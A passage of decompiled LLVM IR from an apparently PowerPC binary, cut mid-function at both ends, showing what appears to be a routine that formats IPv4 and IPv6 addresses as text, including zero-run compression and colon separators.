  %v1_1000c500 = add nsw i32 %v2_1000c4fc, 48
  store i32 %v1_1000c500, i32* %r9.global-to-local, align 4
  %v1_1000c504 = trunc i32 %v1_1000c500 to i8
  %v3_1000c504 = add i32 %v2_1000c4e4, 8
  %v4_1000c504 = inttoptr i32 %v3_1000c504 to i8*
  store i8 %v1_1000c504, i8* %v4_1000c504, align 1
  %v0_1000c508 = load i32, i32* %r12.global-to-local, align 4
  %v1_1000c508 = trunc i32 %v0_1000c508 to i8
  %v2_1000c508 = load i32, i32* %r8.global-to-local, align 4
  %v3_1000c508 = add i32 %v2_1000c508, 8
  %v4_1000c508 = inttoptr i32 %v3_1000c508 to i8*
  store i8 %v1_1000c508, i8* %v4_1000c508, align 1
  %v0_1000c50c = load i32, i32* @r1, align 4
  %v1_1000c50c = load i32, i32* %r11.global-to-local, align 4
  %v2_1000c50c = add i32 %v1_1000c50c, %v0_1000c50c
  store i32 %v2_1000c50c, i32* %r7.global-to-local, align 4
  %v0_1000c510 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000c510 = add i32 %v0_1000c510, -1
  store i32 %v1_1000c510, i32* %ctr.global-to-local, align 4
  %v2_1000c510 = icmp eq i32 %v1_1000c510, 0
  br i1 %v2_1000c510, label %dec_label_pc_1000c514, label %dec_label_pc_1000c4dc.dec_label_pc_1000c468_crit_edge

dec_label_pc_1000c4dc.dec_label_pc_1000c468_crit_edge: ; preds = %dec_label_pc_1000c4dc
  %v1_1000c468.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000c468

dec_label_pc_1000c514:                            ; preds = %dec_label_pc_1000c4dc
  %v2_1000c514 = ptrtoint i16* %stack_var_-56 to i32
  store i32 %v2_1000c514, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000c51c = add i32 %v1_1000c50c, %v2_1000c514
  store i32 %v2_1000c51c, i32* %r9.global-to-local, align 4
  store i32 %v2_1000c514, i32* @r3, align 4
  %v3_1000c524 = add i32 %v2_1000c51c, -1
  %v4_1000c524 = inttoptr i32 %v3_1000c524 to i8*
  store i8 0, i8* %v4_1000c524, align 1
  %v0_1000c528 = call i32 @function_10007288()
  store i32 %v0_1000c528, i32* %r3.global-to-local, align 4
  %v1_1000c52c = load i32, i32* @r30, align 4
  %v3_1000c52c = icmp ugt i32 %v0_1000c528, %v1_1000c52c
  br i1 %v3_1000c52c, label %dec_label_pc_1000c534, label %dec_label_pc_1000c548

dec_label_pc_1000c534:                            ; preds = %dec_label_pc_1000c514
  %v0_1000c534 = call i32 @function_10004e38()
  store i32 %v0_1000c534, i32* %r3.global-to-local, align 4
  store i32 28, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_1000c540 = inttoptr i32 %v0_1000c534 to i32*
  store i32 28, i32* %v2_1000c540, align 4
  %v0_1000c55c.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c558

dec_label_pc_1000c548:                            ; preds = %dec_label_pc_1000c514
  %v0_1000c548 = load i32, i32* @r29, align 4
  store i32 %v0_1000c548, i32* %r3.global-to-local, align 4
  store i32 %v2_1000c514, i32* %r4.global-to-local, align 4
  %v2_1000c550 = bitcast i16* %stack_var_-56 to i8*
  %v3_1000c550 = call i32 @function_10007268(i32 %v0_1000c548, i8* %v2_1000c550)
  store i32 %v3_1000c550, i32* %r3.global-to-local, align 4
  store i32 %v3_1000c550, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c558

dec_label_pc_1000c558:                            ; preds = %dec_label_pc_1000c534, %dec_label_pc_1000c548
  %v0_1000c55c = phi i32 [ %v0_1000c55c.pre, %dec_label_pc_1000c534 ], [ %v3_1000c550, %dec_label_pc_1000c548 ]
  store i32 %v0_1000c410, i32* %r0.global-to-local, align 4
  store i32 %v0_1000c55c, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000c55c

; uselistorder directives
  uselistorder i32 %v0_1000c55c, { 1, 0 }
  uselistorder i32 %v2_1000c514, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1000c510, { 1, 0 }
  uselistorder i32 %v2_1000c50c, { 1, 0 }
  uselistorder i32 %v0_1000c4e0, { 1, 0, 2 }
  uselistorder i32 %v1_1000c4a4, { 1, 0, 2 }
  uselistorder i32 %v2_1000c494, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_1000c480, { 1, 0 }
  uselistorder i32 %v0_1000c46c, { 1, 0 }
  uselistorder i32 %v0_1000c50c2, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 1, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i16 0, { 13, 11, 0, 1, 2, 3, 4, 12, 5, 6, 7, 8, 9, 10, 14 }
  uselistorder i32 15, { 0, 1, 7, 6, 4, 5, 2, 3 }
  uselistorder label %dec_label_pc_1000c558, { 1, 0 }
  uselistorder label %dec_label_pc_1000c4dc, { 2, 1, 0 }
}

define i32 @function_1000c570(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000c570:
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %v1_1000c570 = icmp slt i32 %arg1, 2
  %v3_1000c570 = icmp eq i32 %arg1, 2
  store i1 %v1_1000c570, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c570, i1* %cr7_eq.global-to-local, align 1
  store i32 %arg2, i32* @r27, align 4
  store i32 %arg3, i32* @r25, align 4
  store i32 %arg4, i32* @r26, align 4
  br i1 %v3_1000c570, label %dec_label_pc_1000c5a0, label %dec_label_pc_1000c594

dec_label_pc_1000c594:                            ; preds = %dec_label_pc_1000c570
  %v1_1000c594 = icmp slt i32 %arg1, 10
  %v3_1000c594 = icmp eq i32 %arg1, 10
  store i1 %v1_1000c594, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c594, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000c594, label %dec_label_pc_1000c5d8.lr.ph, label %dec_label_pc_1000c7ec

dec_label_pc_1000c5a0:                            ; preds = %dec_label_pc_1000c570
  store i32 ptrtoint (i32* @global_var_1000c5b0.344 to i32), i32* @lr, align 4
  %v3_1000c5ac = call i32 @function_1000c410(i32 %arg2, i32 %arg3, i32 %arg4)
  br label %dec_label_pc_1000c7e4

dec_label_pc_1000c5d8.lr.ph:                      ; preds = %dec_label_pc_1000c594
  %v2_1000c5b4 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_1000c5b4, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000c5c8.345 to i32), i32* @lr, align 4
  %v3_1000c5c4 = call i32 @function_100071a4(i32 %v2_1000c5b4, i32 0, i32 32)
  store i32 0, i32* %r11.global-to-local, align 4
  %v0_1000c5f815 = load i32, i32* @r27, align 4
  store i32 %v0_1000c5f815, i32* %r9.global-to-local, align 4
  store i32 8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000c5d8

dec_label_pc_1000c5d8:                            ; preds = %dec_label_pc_1000c5d8.lr.ph, %dec_label_pc_1000c5d8
  %v1_1000c5ec = phi i32 [ 0, %dec_label_pc_1000c5d8.lr.ph ], [ %v1_1000c5fc, %dec_label_pc_1000c5d8 ]
  %v0_1000c5d8 = phi i32 [ %v0_1000c5f815, %dec_label_pc_1000c5d8.lr.ph ], [ %v0_1000c5f8, %dec_label_pc_1000c5d8 ]
  %v0_1000c5e0 = phi i32 [ %v0_1000c5f815, %dec_label_pc_1000c5d8.lr.ph ], [ %v2_1000c5f8, %dec_label_pc_1000c5d8 ]
  %v1_1000c5d8 = phi i32 [ 0, %dec_label_pc_1000c5d8.lr.ph ], [ %v0_1000c5f0, %dec_label_pc_1000c5d8 ]
  %v2_1000c5d8 = add i32 %v0_1000c5d8, %v1_1000c5d8
  %v3_1000c5d8 = inttoptr i32 %v2_1000c5d8 to i8*
  %v4_1000c5d8 = load i8, i8* %v3_1000c5d8, align 1
  %v5_1000c5d8 = zext i8 %v4_1000c5d8 to i32
  %v1_1000c5dc = add i32 %v1_1000c5d8, 2
  store i32 %v1_1000c5dc, i32* %r11.global-to-local, align 4
  %v1_1000c5e0 = add i32 %v0_1000c5e0, 1
  %v2_1000c5e0 = inttoptr i32 %v1_1000c5e0 to i8*
  %v3_1000c5e0 = load i8, i8* %v2_1000c5e0, align 1
  %v4_1000c5e0 = zext i8 %v3_1000c5e0 to i32
  %v1_1000c5e4 = mul nuw nsw i32 %v5_1000c5d8, 256
  %v2_1000c5e8 = or i32 %v4_1000c5e0, %v1_1000c5e4
  %v2_1000c5ec = load i32, i32* %r29.global-to-local, align 4
  %v3_1000c5ec = add i32 %v2_1000c5ec, %v1_1000c5ec
  %v4_1000c5ec = inttoptr i32 %v3_1000c5ec to i32*
  store i32 %v2_1000c5e8, i32* %v4_1000c5ec, align 4
  %v0_1000c5f0 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000c5f0 = udiv i32 %v0_1000c5f0, 2
  %v0_1000c5f8 = load i32, i32* @r27, align 4
  %v2_1000c5f8 = add i32 %v0_1000c5f8, %v0_1000c5f0
  store i32 %v2_1000c5f8, i32* %r9.global-to-local, align 4
  %v1_1000c5fc = mul i32 %v1_1000c5f0, 4
  %v0_1000c600 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000c600 = add i32 %v0_1000c600, -1
  store i32 %v1_1000c600, i32* %ctr.global-to-local, align 4
  %v2_1000c600 = icmp eq i32 %v1_1000c600, 0
  br i1 %v2_1000c600, label %dec_label_pc_1000c620.lr.ph, label %dec_label_pc_1000c5d8

dec_label_pc_1000c620.lr.ph:                      ; preds = %dec_label_pc_1000c5d8
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 -1, i32* @r28, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  store i32 8, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000c620

dec_label_pc_1000c620:                            ; preds = %dec_label_pc_1000c620.lr.ph, %dec_label_pc_1000c66c
  %v0_1000c670 = phi i32 [ 8, %dec_label_pc_1000c620.lr.ph ], [ %v1_1000c670, %dec_label_pc_1000c66c ]
  %v0_1000c660 = phi i32 [ -1, %dec_label_pc_1000c620.lr.ph ], [ %v0_1000c66042, %dec_label_pc_1000c66c ]
  %v0_1000c650 = phi i32 [ -1, %dec_label_pc_1000c620.lr.ph ], [ %v0_1000c65039, %dec_label_pc_1000c66c ]
  %v0_1000c624 = phi i32 [ -1, %dec_label_pc_1000c620.lr.ph ], [ %v0_1000c62435, %dec_label_pc_1000c66c ]
  %v0_1000c66c = phi i32 [ 0, %dec_label_pc_1000c620.lr.ph ], [ %v1_1000c66c, %dec_label_pc_1000c66c ]
  %v1_1000c620 = mul i32 %v0_1000c66c, 4
  %v3_1000c624 = icmp eq i32 %v0_1000c624, -1
  %v2_1000c628 = add i32 %v1_1000c620, %v2_1000c5b4
  %v3_1000c628 = inttoptr i32 %v2_1000c628 to i32*
  %v4_1000c628 = load i32, i32* %v3_1000c628, align 4
  %v3_1000c62c = icmp eq i32 %v4_1000c628, 0
  br i1 %v3_1000c62c, label %dec_label_pc_1000c634, label %dec_label_pc_1000c64c

dec_label_pc_1000c634:                            ; preds = %dec_label_pc_1000c620
  br i1 %v3_1000c624, label %dec_label_pc_1000c638, label %dec_label_pc_1000c644

dec_label_pc_1000c638:                            ; preds = %dec_label_pc_1000c634
  store i32 %v0_1000c66c, i32* %r9.global-to-local, align 4
  store i32 1, i32* @r31, align 4
  br label %dec_label_pc_1000c66c

dec_label_pc_1000c644:                            ; preds = %dec_label_pc_1000c634
  %v0_1000c644 = load i32, i32* @r31, align 4
  %v1_1000c644 = add i32 %v0_1000c644, 1
  store i32 %v1_1000c644, i32* @r31, align 4
  br label %dec_label_pc_1000c66c

dec_label_pc_1000c64c:                            ; preds = %dec_label_pc_1000c620
  br i1 %v3_1000c624, label %dec_label_pc_1000c66c, label %dec_label_pc_1000c650

dec_label_pc_1000c650:                            ; preds = %dec_label_pc_1000c64c
  %v3_1000c650 = icmp eq i32 %v0_1000c650, -1
  %v0_1000c664.pre = load i32, i32* @r31, align 4
  %v1_1000c658 = load i32, i32* @r30, align 4
  %v3_1000c658 = icmp sgt i32 %v0_1000c664.pre, %v1_1000c658
  %or.cond = or i1 %v3_1000c650, %v3_1000c658
  br i1 %or.cond, label %dec_label_pc_1000c660, label %dec_label_pc_1000c668

dec_label_pc_1000c660:                            ; preds = %dec_label_pc_1000c650
  store i32 %v0_1000c660, i32* @r28, align 4
  store i32 %v0_1000c664.pre, i32* @r30, align 4
  br label %dec_label_pc_1000c668

dec_label_pc_1000c668:                            ; preds = %dec_label_pc_1000c650, %dec_label_pc_1000c660
  %v0_1000c65040 = phi i32 [ %v0_1000c660, %dec_label_pc_1000c660 ], [ %v0_1000c650, %dec_label_pc_1000c650 ]
  store i32 -1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c66c

dec_label_pc_1000c66c:                            ; preds = %dec_label_pc_1000c64c, %dec_label_pc_1000c644, %dec_label_pc_1000c638, %dec_label_pc_1000c668
  %v0_1000c66042 = phi i32 [ %v0_1000c660, %dec_label_pc_1000c64c ], [ %v0_1000c660, %dec_label_pc_1000c644 ], [ %v0_1000c66c, %dec_label_pc_1000c638 ], [ -1, %dec_label_pc_1000c668 ]
  %v0_1000c62435 = phi i32 [ -1, %dec_label_pc_1000c64c ], [ %v0_1000c624, %dec_label_pc_1000c644 ], [ %v0_1000c66c, %dec_label_pc_1000c638 ], [ -1, %dec_label_pc_1000c668 ]
  %v0_1000c65039 = phi i32 [ %v0_1000c650, %dec_label_pc_1000c64c ], [ %v0_1000c650, %dec_label_pc_1000c644 ], [ %v0_1000c650, %dec_label_pc_1000c638 ], [ %v0_1000c65040, %dec_label_pc_1000c668 ]
  %v1_1000c66c = add nuw nsw i32 %v0_1000c66c, 1
  store i32 %v1_1000c66c, i32* %r11.global-to-local, align 4
  %v1_1000c670 = add nsw i32 %v0_1000c670, -1
  store i32 %v1_1000c670, i32* %ctr.global-to-local, align 4
  %v2_1000c670 = icmp eq i32 %v1_1000c670, 0
  br i1 %v2_1000c670, label %dec_label_pc_1000c674, label %dec_label_pc_1000c620

dec_label_pc_1000c674:                            ; preds = %dec_label_pc_1000c66c
  %v3_1000c674 = icmp eq i32 %v0_1000c66042, -1
  %v1_1000c694 = icmp slt i32 %v0_1000c65039, -1
  %v3_1000c694 = icmp eq i32 %v0_1000c65039, -1
  store i1 %v1_1000c694, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c694, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000c674, label %dec_label_pc_1000c694, label %dec_label_pc_1000c67c

dec_label_pc_1000c67c:                            ; preds = %dec_label_pc_1000c674
  %v0_1000c68c.pre = load i32, i32* @r31, align 4
  br i1 %v3_1000c694, label %dec_label_pc_1000c68c, label %dec_label_pc_1000c684

dec_label_pc_1000c684:                            ; preds = %dec_label_pc_1000c67c
  %v1_1000c684 = load i32, i32* @r30, align 4
  %v2_1000c684 = icmp slt i32 %v0_1000c68c.pre, %v1_1000c684
  %v3_1000c684 = icmp sgt i32 %v0_1000c68c.pre, %v1_1000c684
  %v4_1000c684 = icmp eq i32 %v0_1000c68c.pre, %v1_1000c684
  store i1 %v2_1000c684, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000c684, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000c684, label %dec_label_pc_1000c68c, label %dec_label_pc_1000c694.thread

dec_label_pc_1000c68c:                            ; preds = %dec_label_pc_1000c67c, %dec_label_pc_1000c684
  store i32 %v0_1000c68c.pre, i32* @r30, align 4
  store i32 %v0_1000c66042, i32* @r28, align 4
  br label %dec_label_pc_1000c694.thread

dec_label_pc_1000c694.thread:                     ; preds = %dec_label_pc_1000c68c, %dec_label_pc_1000c684
  %v0_1000c69c76 = phi i32 [ %v1_1000c684, %dec_label_pc_1000c684 ], [ %v0_1000c68c.pre, %dec_label_pc_1000c68c ]
  %v0_1000c694.ph = phi i32 [ %v0_1000c65039, %dec_label_pc_1000c684 ], [ %v0_1000c66042, %dec_label_pc_1000c68c ]
  %v1_1000c69459 = icmp slt i32 %v0_1000c694.ph, -1
  %v3_1000c69461 = icmp eq i32 %v0_1000c694.ph, -1
  store i1 %v1_1000c69459, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c69461, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_1000c69c

dec_label_pc_1000c694:                            ; preds = %dec_label_pc_1000c674
  br i1 %v3_1000c694, label %dec_label_pc_1000c6a8, label %dec_label_pc_1000c694.dec_label_pc_1000c69c_crit_edge

dec_label_pc_1000c694.dec_label_pc_1000c69c_crit_edge: ; preds = %dec_label_pc_1000c694
  %v0_1000c69c.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000c69c

dec_label_pc_1000c69c:                            ; preds = %dec_label_pc_1000c694.dec_label_pc_1000c69c_crit_edge, %dec_label_pc_1000c694.thread
  %v0_1000c69c = phi i32 [ %v0_1000c69c76, %dec_label_pc_1000c694.thread ], [ %v0_1000c69c.pre, %dec_label_pc_1000c694.dec_label_pc_1000c69c_crit_edge ]
  %v0_1000c69462 = phi i32 [ %v0_1000c694.ph, %dec_label_pc_1000c694.thread ], [ %v0_1000c65039, %dec_label_pc_1000c694.dec_label_pc_1000c69c_crit_edge ]
  %v1_1000c69c = icmp slt i32 %v0_1000c69c, 1
  %v2_1000c69c = icmp sgt i32 %v0_1000c69c, 1
  %v3_1000c69c = icmp eq i32 %v0_1000c69c, 1
  store i1 %v1_1000c69c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c69c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000c69c, label %dec_label_pc_1000c6a8, label %dec_label_pc_1000c6a4

dec_label_pc_1000c6a4:                            ; preds = %dec_label_pc_1000c69c
  store i32 -1, i32* @r28, align 4
  br label %dec_label_pc_1000c6a8

dec_label_pc_1000c6a8:                            ; preds = %dec_label_pc_1000c69c, %dec_label_pc_1000c694, %dec_label_pc_1000c6a4
  %v0_1000c6b43 = phi i32 [ %v0_1000c69462, %dec_label_pc_1000c69c ], [ -1, %dec_label_pc_1000c694 ], [ -1, %dec_label_pc_1000c6a4 ]
  %v2_1000c6a8 = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_1000c6a8, i32* %r29.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  %v1_1000c6b44 = icmp slt i32 %v0_1000c6b43, -1
  %v3_1000c6b46 = icmp eq i32 %v0_1000c6b43, -1
  store i1 %v1_1000c6b44, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c6b46, i1* %cr7_eq.global-to-local, align 1
  %v2_1000c724 = icmp slt i32 %tmp, 65535
  %v4_1000c724 = icmp eq i32 %tmp, 65535
  br label %dec_label_pc_1000c6b4

dec_label_pc_1000c6b4:                            ; preds = %dec_label_pc_1000c6a8, %dec_label_pc_1000c780
  %v2_1000c6f0 = phi i32 [ %v2_1000c6a8, %dec_label_pc_1000c6a8 ], [ %v2_1000c6d851, %dec_label_pc_1000c780 ]
  %v0_1000c6c4 = phi i32 [ %v0_1000c6b43, %dec_label_pc_1000c6a8 ], [ %v0_1000c6b4, %dec_label_pc_1000c780 ]
  %v0_1000c6e4 = phi i32 [ 0, %dec_label_pc_1000c6a8 ], [ %v1_1000c780, %dec_label_pc_1000c780 ]
  %v3_1000c6b47 = phi i1 [ %v3_1000c6b46, %dec_label_pc_1000c6a8 ], [ %v3_1000c6b4, %dec_label_pc_1000c780 ]
  br i1 %v3_1000c6b47, label %dec_label_pc_1000c6e4, label %dec_label_pc_1000c6bc

dec_label_pc_1000c6bc:                            ; preds = %dec_label_pc_1000c6b4
  %v2_1000c6bc = icmp slt i32 %v0_1000c6e4, %v0_1000c6c4
  %v4_1000c6bc = icmp eq i32 %v0_1000c6e4, %v0_1000c6c4
  br i1 %v2_1000c6bc, label %dec_label_pc_1000c6e4, label %dec_label_pc_1000c6c4

dec_label_pc_1000c6c4:                            ; preds = %dec_label_pc_1000c6bc
  %v1_1000c6c4 = load i32, i32* @r30, align 4
  %v2_1000c6c4 = add i32 %v1_1000c6c4, %v0_1000c6c4
  %v2_1000c6c8 = icmp slt i32 %v0_1000c6e4, %v2_1000c6c4
  %v4_1000c6c8 = icmp eq i32 %v0_1000c6e4, %v2_1000c6c4
  store i1 %v2_1000c6c8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000c6c8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1000c6c8, label %dec_label_pc_1000c6d0, label %dec_label_pc_1000c6e4

dec_label_pc_1000c6d0:                            ; preds = %dec_label_pc_1000c6c4
  br i1 %v4_1000c6bc, label %dec_label_pc_1000c6d4, label %dec_label_pc_1000c780

dec_label_pc_1000c6d4:                            ; preds = %dec_label_pc_1000c6d0
  %v3_1000c6d8 = inttoptr i32 %v2_1000c6f0 to i8*
  store i8 58, i8* %v3_1000c6d8, align 1
  %v0_1000c6dc = load i32, i32* %r29.global-to-local, align 4
  %v1_1000c6dc = add i32 %v0_1000c6dc, 1
  store i32 %v1_1000c6dc, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000c780

dec_label_pc_1000c6e4:                            ; preds = %dec_label_pc_1000c6c4, %dec_label_pc_1000c6bc, %dec_label_pc_1000c6b4
  %v1_1000c6e4 = icmp slt i32 %v0_1000c6e4, 0
  %v3_1000c6e4 = icmp eq i32 %v0_1000c6e4, 0
  store i1 %v1_1000c6e4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c6e4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000c6e4, label %dec_label_pc_1000c6f8.thread, label %dec_label_pc_1000c6f8

dec_label_pc_1000c6f8.thread:                     ; preds = %dec_label_pc_1000c6e4
  store i1 true, i1* %cr7_lt.global-to-local, align 1
  store i1 false, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_1000c75c

dec_label_pc_1000c6f8:                            ; preds = %dec_label_pc_1000c6e4
  %v3_1000c6f0 = inttoptr i32 %v2_1000c6f0 to i8*
  store i8 58, i8* %v3_1000c6f0, align 1
  %v0_1000c6f4 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000c6f4 = add i32 %v0_1000c6f4, 1
  store i32 %v1_1000c6f4, i32* %r29.global-to-local, align 4
  %v0_1000c6f8.pre = load i32, i32* @r31, align 4
  %v1_1000c6f8 = icmp slt i32 %v0_1000c6f8.pre, 6
  %v3_1000c6f8 = icmp eq i32 %v0_1000c6f8.pre, 6
  store i1 %v1_1000c6f8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c6f8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000c6f8, label %dec_label_pc_1000c700, label %dec_label_pc_1000c75c

dec_label_pc_1000c700:                            ; preds = %dec_label_pc_1000c6f8
  %v0_1000c700 = load i32, i32* @r28, align 4
  %v1_1000c700 = icmp slt i32 %v0_1000c700, 0
  %v3_1000c700 = icmp eq i32 %v0_1000c700, 0
  store i1 %v1_1000c700, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c700, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000c700, label %dec_label_pc_1000c708, label %dec_label_pc_1000c75c

dec_label_pc_1000c708:                            ; preds = %dec_label_pc_1000c700
  %v0_1000c708 = load i32, i32* @r30, align 4
  %v1_1000c708 = icmp slt i32 %v0_1000c708, 6
  %v3_1000c708 = icmp eq i32 %v0_1000c708, 6
  store i1 %v1_1000c708, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c708, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000c708, label %dec_label_pc_1000c72c, label %dec_label_pc_1000c710

dec_label_pc_1000c710:                            ; preds = %dec_label_pc_1000c708
  %v1_1000c710 = icmp slt i32 %v0_1000c708, 5
  %v3_1000c710 = icmp eq i32 %v0_1000c708, 5
  store i1 %v1_1000c710, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c710, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000c710, label %dec_label_pc_1000c718, label %dec_label_pc_1000c75c

dec_label_pc_1000c718:                            ; preds = %dec_label_pc_1000c710
  store i32 %tmp, i32* %r9.global-to-local, align 4
  store i1 %v2_1000c724, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000c724, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_1000c724, label %dec_label_pc_1000c72c, label %dec_label_pc_1000c75c

dec_label_pc_1000c72c:                            ; preds = %dec_label_pc_1000c718, %dec_label_pc_1000c708
  %v1_1000c72c = load i32, i32* @r1, align 4
  %v2_1000c72c = sub i32 %v1_1000c72c, %v1_1000c6f4
  %v0_1000c730 = load i32, i32* @r27, align 4
  %v1_1000c730 = add i32 %v0_1000c730, 12
  %v1_1000c734 = add i32 %v2_1000c72c, 86
  store i32 ptrtoint ([3 x i8]* @global_var_1000c740.346 to i32), i32* @lr, align 4
  %v3_1000c73c = call i32 @function_1000c410(i32 %v1_1000c730, i32 %v1_1000c6f4, i32 %v1_1000c734)
  store i32 0, i32* %r9.global-to-local, align 4
  %v1_1000c744 = icmp slt i32 %v3_1000c73c, 0
  %v3_1000c744 = icmp eq i32 %v3_1000c73c, 0
  store i1 %v1_1000c744, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c744, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000c744, label %dec_label_pc_1000c7fc, label %dec_label_pc_1000c74c

dec_label_pc_1000c74c:                            ; preds = %dec_label_pc_1000c72c
  %v0_1000c74c = load i32, i32* @r29, align 4
  store i32 %v0_1000c74c, i32* @r3, align 4
  %v0_1000c750 = call i32 @function_10007288()
  %v0_1000c754 = load i32, i32* @r29, align 4
  %v2_1000c754 = add i32 %v0_1000c754, %v0_1000c750
  store i32 %v2_1000c754, i32* %r29.global-to-local, align 4
  %v0_1000c794.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000c794

dec_label_pc_1000c75c:                            ; preds = %dec_label_pc_1000c6f8.thread, %dec_label_pc_1000c718, %dec_label_pc_1000c710, %dec_label_pc_1000c700, %dec_label_pc_1000c6f8
  %v0_1000c75c67 = phi i32 [ 0, %dec_label_pc_1000c6f8.thread ], [ 6, %dec_label_pc_1000c718 ], [ 6, %dec_label_pc_1000c710 ], [ 6, %dec_label_pc_1000c700 ], [ %v0_1000c6f8.pre, %dec_label_pc_1000c6f8 ]
  %v0_1000c73866 = phi i32 [ %v2_1000c6f0, %dec_label_pc_1000c6f8.thread ], [ %v1_1000c6f4, %dec_label_pc_1000c718 ], [ %v1_1000c6f4, %dec_label_pc_1000c710 ], [ %v1_1000c6f4, %dec_label_pc_1000c700 ], [ %v1_1000c6f4, %dec_label_pc_1000c6f8 ]
  %v1_1000c75c = mul i32 %v0_1000c75c67, 4
  store i32 %v2_1000c5b4, i32* %r9.global-to-local, align 4
  %v2_1000c764 = add i32 %v1_1000c75c, %v2_1000c5b4
  %v3_1000c764 = inttoptr i32 %v2_1000c764 to i32*
  %v4_1000c764 = load i32, i32* %v3_1000c764, align 4
  store i32 %v0_1000c73866, i32* @r3, align 4
  store i32 268486524, i32* @lr, align 4
  %v5_1000c778 = call i32 @function_10004fac(i32 %v0_1000c73866, i32 ptrtoint ([3 x i8]* @global_var_1000f914.347 to i32), i32 %v4_1000c764, i32 %v2_1000c5b4)
  %v0_1000c77c = load i32, i32* @r29, align 4
  %v2_1000c77c = add i32 %v0_1000c77c, %v5_1000c778
  store i32 %v2_1000c77c, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000c780

dec_label_pc_1000c780:                            ; preds = %dec_label_pc_1000c6d0, %dec_label_pc_1000c6d4, %dec_label_pc_1000c75c
  %v2_1000c6d851 = phi i32 [ %v2_1000c6f0, %dec_label_pc_1000c6d0 ], [ %v1_1000c6dc, %dec_label_pc_1000c6d4 ], [ %v2_1000c77c, %dec_label_pc_1000c75c ]
  %v0_1000c780 = load i32, i32* @r31, align 4
  %v1_1000c780 = add i32 %v0_1000c780, 1
  store i32 %v1_1000c780, i32* @r31, align 4
  %tmp73 = icmp slt i32 %v1_1000c780, 8
  %v0_1000c6b4 = load i32, i32* @r28, align 4
  %v1_1000c6b4 = icmp slt i32 %v0_1000c6b4, -1
  %v3_1000c6b4 = icmp eq i32 %v0_1000c6b4, -1
  store i1 %v1_1000c6b4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000c6b4, i1* %cr7_eq.global-to-local, align 1
  br i1 %tmp73, label %dec_label_pc_1000c6b4, label %dec_label_pc_1000c78c

dec_label_pc_1000c78c:                            ; preds = %dec_label_pc_1000c780
  br i1 %v3_1000c6b4, label %dec_label_pc_1000c7ac, label %dec_label_pc_1000c794

dec_label_pc_1000c794:                            ; preds = %dec_label_pc_1000c78c, %dec_label_pc_1000c74c
